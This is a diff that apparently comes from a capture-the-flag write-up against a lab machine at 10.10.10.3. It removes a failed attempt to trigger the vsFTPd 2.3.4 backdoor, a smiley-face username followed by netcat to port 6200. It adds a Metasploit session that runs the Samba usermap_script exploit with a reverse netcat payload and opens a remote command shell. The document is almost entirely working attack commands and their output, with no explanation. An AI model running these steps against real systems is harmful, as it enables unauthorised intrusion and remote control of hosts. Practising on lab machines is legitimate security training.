@@ -1,9 +1,54 @@
-hippoeug@kali:~$ ftp 10.10.10.3
-Connected to 10.10.10.3.
-220 (vsFTPd 2.3.4)
-Name (10.10.10.3:hippoeug): 123456:)
-331 Please specify the password.
-Password:
-^C
-421 Service not available, remote server has closed connection
-hippoeug@kali:~$ nc -vn 10.10.10.3 6200
+hippoeug@kali:~$ msfconsole
+                                                  
+ _                                                    _
+/ \    /\         __                         _   __  /_/ __
+| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
+| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
+|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
+      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
+
+
+       =[ metasploit v5.0.99-dev                          ]
++ -- --=[ 2045 exploits - 1106 auxiliary - 344 post       ]
++ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Use help <command> to learn more about any command
+
+msf5 > use exploit/multi/samba/usermap_script
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf5 exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.204.129  yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(multi/samba/usermap_script) > set lhost 10.10.14.16
+lhost => 10.10.14.16
+msf5 exploit(multi/samba/usermap_script) > set rhost 10.10.10.3
+rhost => 10.10.10.3
+msf5 exploit(multi/samba/usermap_script) > run
+
+[*] Started reverse TCP handler on 10.10.14.16:4444 
+[*] Command shell session 1 opened (10.10.14.16:4444 -> 10.10.10.3:44602) at 2021-01-02 22:39:18 +0800
+
+
